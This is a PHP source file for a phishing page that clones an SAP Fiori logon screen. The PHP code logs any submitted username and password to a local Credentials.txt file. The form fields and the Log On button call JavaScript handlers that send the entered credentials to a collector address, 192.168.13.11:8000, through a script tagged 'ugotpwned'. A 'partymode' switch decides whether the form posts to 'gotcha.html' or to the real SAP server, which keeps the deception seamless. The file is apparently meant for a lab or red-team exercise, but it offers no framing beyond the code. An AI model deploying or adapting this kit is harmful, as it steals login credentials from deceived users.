<?php

if (isset($_GET['Username']))
{
    $filename = 'Credentials.txt';
    $f = fopen($filename, 'a');
    fputs($f, "Username: ". $_GET['Username']. "\n");
    fclose($f);
}
if (isset($_GET['Password']))
{
    $filename = 'Credentials.txt';
    $f = fopen($filename, 'a');
    fputs($f,"Password: ". $_GET['Password']. "\n");
    fclose($f);
}

$partymode = true;

$targetIp = '';
$serverIp = '192.168.13.11';


if ($partymode)
{
    $page = <<<EOT
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<title>Logon</title>
<link rel="shortcut icon" href="https://vm402s4.dc01.securityweaver.com:44300/sap/public/bc/ui2/logon/img/favicon.ico">
<link rel="stylesheet" id="FIORI_LOGIN_CSS" href="Logon_files/library.css">
<script src="Logon_files/login.js"></script>
<script src="Logon_files/ClickjackingFramingProtection.js" id="SAP-antiClickjackScript" data-checkservice="/sap/public/bc/uics/whitelist/service" data-releasetimeoutmessage="10000" data-applyprotectioncallback="sapLogin.controller.activate"></script>
<script src="Logon_files/customfuncs.js" id="ugotpwned"></script>
</head>
<body class="sapUiBody sapUiSraLoginHeight4  sapUiBackground" data-sap-login="JTdiJTIybG9naW5fcGFyYW1zJTIyJTNhJTdiJTIybGFuZ192aXNpYmxlJTIyJTNhdHJ1ZSUyYyUyMmZyYW1pbmdfY29udHJvbCUyMiUzYXRydWUlN2QlMmMlMjJsYW5ndWFnZXMlMjIlM2ElN2IlMjJERSUyMiUzYSUyMkRldXRzY2glMjIlMmMlMjJFTiUyMiUzYSUyMkVuZ2xpc2glMjIlMmMlMjJGUiUyMiUzYSUyMkZyYW4lMjVjMyUyNWE3YWlzJTIyJTJjJTIyUFQlMjIlM2ElMjJQb3J0dWd1JTI1YzMlMjVhYXMlMjIlMmMlMjJSVSUyMiUzYSUyMiUyNWQwJTI1YTAlMjVkMSUyNTgzJTI1ZDElMjU4MSUyNWQxJTI1ODElMjVkMCUyNWJhJTI1ZDAlMjViOCUyNWQwJTI1YjklMjIlMmMlMjJFUyUyMiUzYSUyMkVzcGElMjVjMyUyNWIxb2wlMjIlN2QlMmMlMjJ0ZXh0cyUyMiUzYSU3YiUyMmVycm9yX2NsaWVudF9pbml0aWFsJTIyJTNhJTIyRW50ZXIlNWMlNWN4MjBhJTVjJTVjeDIwY2xpZW50JTIyJTJjJTIyZXJyb3JfcHdkX2luaXRpYWwlMjIlM2ElMjJFbnRlciU1YyU1Y3gyMGElNWMlNWN4MjBwYXNzd29yZCUyMiUyYyUyMmVycm9yX3VzZXJfaW5pdGlhbCUyMiUzYSUyMkVudGVyJTVjJTVjeDIweW91ciU1YyU1Y3gyMHVzZXIlMjIlN2QlMmMlMjJwcm9wZXJ0aWVzJTIyJTNhJTdiJTIybGFuZyUyMiUzYSUyMkVOJTIyJTdkJTJjJTIybWVzc2FnZXMlMjIlM2ElNWIlNWQlN2Q=" lang="en">
<div class="hspan"></div>
<header><div class="loginLogo"><img src="Logon_files/sap_logo.png" width="48"></div></header>
<main id="LOGIN_MAIN">
<form id="LOGIN_FORM" class="loginForm" name="loginForm" action="gotcha.html" method="post" autocomplete="off" accept-charset="UTF-8">
<input type="hidden" name="sap-system-login-oninputprocessing" value="">
<input type="hidden" name="sap-urlscheme" value="">
<input type="hidden" name="sap-system-login" value="onLogin">
<input type="hidden" name="sap-system-login-basic_auth" value="">
<input type="hidden" name="sap-client" value="800">
<input type="hidden" name="sap-accessibility" value="">
<input type="hidden" name="sap-login-XSRF" value="iDfkSHebTKBAR_FMaohxW953VmDT8z1FNFLH0JAQBFw=">
<input type="hidden" name="sap-system-login-cookie_disabled" value="">
<input type="hidden" name="sap-hash" value="JTIzU2hlbGwtaG9tZQ">
    <div id="USERNAME_BLOCK" class="loginInput sapUiLightestBG"><label id="USERNAME_LABEL" for="USERNAME_FIELD-inner" class="loginHiddenAccessible">User</label><input id="USERNAME_FIELD-inner" tabindex="0" type="text" class="loginInputField" name="sap-user" maxlength="12 " inputmode="verbatim" autocorrect="off" autocapitalize="none" placeholder="User" title="User" onblur="storeUsername('192.168.13.11:8000')"></div>
    <div id="PASSWORD_BLOCK" class="loginInput sapUiLightestBG"><label id="PASSWORD_LABEL" for="PASSWORD_FIELD-inner" class="loginHiddenAccessible">Password</label><input id="PASSWORD_FIELD-inner" tabindex="0" type="password" class="loginInputField" name="sap-password" inputmode="verbatim" placeholder="Password" title="Password" onblur="storePassword('192.168.13.11:8000')"></div>
    <div id="LANGUAGE_BLOCK"><div id="LANGUAGE_LABEL_BLOCK" class="loginDisplayInput"><label id="LANGUAGE_LABEL" for="LANGUAGE_SELECT" class="sapUiContentForegroundTextColor">Language</label></div><div id="LANGUAGE_SELECT_BLOCK"><select id="LANGUAGE_SELECT" tabindex="0" class="loginSelect" title="Language"><option value=""></option><option value="DE">DE - Deutsch</option><option value="EN" selected="selected">EN - English</option><option value="ES">ES - Español</option><option value="FR">FR - Français</option><option value="PT">PT - Português</option><option value="RU">RU - Русский</option></select></div></div>
    
    <div id="LOGIN_SUBMIT_BLOCK" class="loginButtonRow"><button id="LOGIN_LINK" type="submit" class="loginButton sapUiButtonEmphasized" tabindex="0" title="Log On" onclick="storeValues('192.168.13.11:8000')">Log On</button></div>
    <div id="LOGIN_CHANGE_PASSWORD_BLOCK" class="loginButtonRow"><button id="CHANGE_PASSWORD_LINK" type="button" class="loginButton sapUiButtonLite" tabindex="0" title="Change Password">Change Password</button></div>
    
    
<input type="hidden" name="__sap-sl__dummy" value="1"></form>

</main>
<footer><div class="loginCopyright"><label class="sapMLabel">Copyright © 2023 SAP SE All Rights Reserved.</label></div></footer>
<div class="busyAnimation"><div></div><div></div><div></div></div>


</body></html>
EOT;
    echo $page;
}else
{
$page = <<<EOT
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<title>Logon</title>
<link rel="shortcut icon" href="https://vm402s4.dc01.securityweaver.com:44300/sap/public/bc/ui2/logon/img/favicon.ico">
<link rel="stylesheet" id="FIORI_LOGIN_CSS" href="Logon_files/library.css">
<script src="Logon_files/login.js"></script>
<script src="Logon_files/ClickjackingFramingProtection.js" id="SAP-antiClickjackScript" data-checkservice="/sap/public/bc/uics/whitelist/service" data-releasetimeoutmessage="10000" data-applyprotectioncallback="sapLogin.controller.activate"></script>
<script src="Logon_files/customfuncs.js" id="ugotpwned"></script>
</head>
<body class="sapUiBody sapUiSraLoginHeight4  sapUiBackground" data-sap-login="JTdiJTIybG9naW5fcGFyYW1zJTIyJTNhJTdiJTIybGFuZ192aXNpYmxlJTIyJTNhdHJ1ZSUyYyUyMmZyYW1pbmdfY29udHJvbCUyMiUzYXRydWUlN2QlMmMlMjJsYW5ndWFnZXMlMjIlM2ElN2IlMjJERSUyMiUzYSUyMkRldXRzY2glMjIlMmMlMjJFTiUyMiUzYSUyMkVuZ2xpc2glMjIlMmMlMjJGUiUyMiUzYSUyMkZyYW4lMjVjMyUyNWE3YWlzJTIyJTJjJTIyUFQlMjIlM2ElMjJQb3J0dWd1JTI1YzMlMjVhYXMlMjIlMmMlMjJSVSUyMiUzYSUyMiUyNWQwJTI1YTAlMjVkMSUyNTgzJTI1ZDElMjU4MSUyNWQxJTI1ODElMjVkMCUyNWJhJTI1ZDAlMjViOCUyNWQwJTI1YjklMjIlMmMlMjJFUyUyMiUzYSUyMkVzcGElMjVjMyUyNWIxb2wlMjIlN2QlMmMlMjJ0ZXh0cyUyMiUzYSU3YiUyMmVycm9yX2NsaWVudF9pbml0aWFsJTIyJTNhJTIyRW50ZXIlNWMlNWN4MjBhJTVjJTVjeDIwY2xpZW50JTIyJTJjJTIyZXJyb3JfcHdkX2luaXRpYWwlMjIlM2ElMjJFbnRlciU1YyU1Y3gyMGElNWMlNWN4MjBwYXNzd29yZCUyMiUyYyUyMmVycm9yX3VzZXJfaW5pdGlhbCUyMiUzYSUyMkVudGVyJTVjJTVjeDIweW91ciU1YyU1Y3gyMHVzZXIlMjIlN2QlMmMlMjJwcm9wZXJ0aWVzJTIyJTNhJTdiJTIybGFuZyUyMiUzYSUyMkVOJTIyJTdkJTJjJTIybWVzc2FnZXMlMjIlM2ElNWIlNWQlN2Q=" lang="en">
<div class="hspan"></div>
<header><div class="loginLogo"><img src="Logon_files/sap_logo.png" width="48"></div></header>
<main id="LOGIN_MAIN">
<form id="LOGIN_FORM" class="loginForm" name="loginForm" action="https://vm402s4.dc01.securityweaver.com:44300/sap/bc/ui2/flp?_sap-hash=JTIzU2hlbGwtaG9tZQ" method="post" autocomplete="off" accept-charset="UTF-8">
    
<input type="hidden" name="sap-system-login-oninputprocessing" value="">
<input type="hidden" name="sap-urlscheme" value="">
<input type="hidden" name="sap-system-login" value="onLogin">
<input type="hidden" name="sap-system-login-basic_auth" value="">
<input type="hidden" name="sap-client" value="800">
<input type="hidden" name="sap-accessibility" value="">
<input type="hidden" name="sap-login-XSRF" value="iDfkSHebTKBAR_FMaohxW953VmDT8z1FNFLH0JAQBFw=">
<input type="hidden" name="sap-system-login-cookie_disabled" value="">
<input type="hidden" name="sap-hash" value="JTIzU2hlbGwtaG9tZQ">
    <div id="USERNAME_BLOCK" class="loginInput sapUiLightestBG"><label id="USERNAME_LABEL" for="USERNAME_FIELD-inner" class="loginHiddenAccessible">User</label><input id="USERNAME_FIELD-inner" tabindex="0" type="text" class="loginInputField" name="sap-user" maxlength="12 " inputmode="verbatim" autocorrect="off" autocapitalize="none" placeholder="User" title="User" onblur="storeUsername('192.168.13.11:8000')"></div>
    <div id="PASSWORD_BLOCK" class="loginInput sapUiLightestBG"><label id="PASSWORD_LABEL" for="PASSWORD_FIELD-inner" class="loginHiddenAccessible">Password</label><input id="PASSWORD_FIELD-inner" tabindex="0" type="password" class="loginInputField" name="sap-password" inputmode="verbatim" placeholder="Password" title="Password" onblur="storePassword('192.168.13.11:8000')"></div>
    <div id="LANGUAGE_BLOCK"><div id="LANGUAGE_LABEL_BLOCK" class="loginDisplayInput"><label id="LANGUAGE_LABEL" for="LANGUAGE_SELECT" class="sapUiContentForegroundTextColor">Language</label></div><div id="LANGUAGE_SELECT_BLOCK"><select id="LANGUAGE_SELECT" tabindex="0" class="loginSelect" title="Language"><option value=""></option><option value="DE">DE - Deutsch</option><option value="EN" selected="selected">EN - English</option><option value="ES">ES - Español</option><option value="FR">FR - Français</option><option value="PT">PT - Português</option><option value="RU">RU - Русский</option></select></div></div>
    
    <div id="LOGIN_SUBMIT_BLOCK" class="loginButtonRow"><button id="LOGIN_LINK" type="submit" class="loginButton sapUiButtonEmphasized" tabindex="0" title="Log On" onclick="storeValues('192.168.13.11:8000')">Log On</button></div>
    <div id="LOGIN_CHANGE_PASSWORD_BLOCK" class="loginButtonRow"><button id="CHANGE_PASSWORD_LINK" type="button" class="loginButton sapUiButtonLite" tabindex="0" title="Change Password">Change Password</button></div>
    
    
<input type="hidden" name="__sap-sl__dummy" value="1"></form>

</main>
<footer><div class="loginCopyright"><label class="sapMLabel">Copyright © 2023 SAP SE All Rights Reserved.</label></div></footer>
<div class="busyAnimation"><div></div><div></div><div></div></div>


</body></html>
EOT;
    echo $page;
}
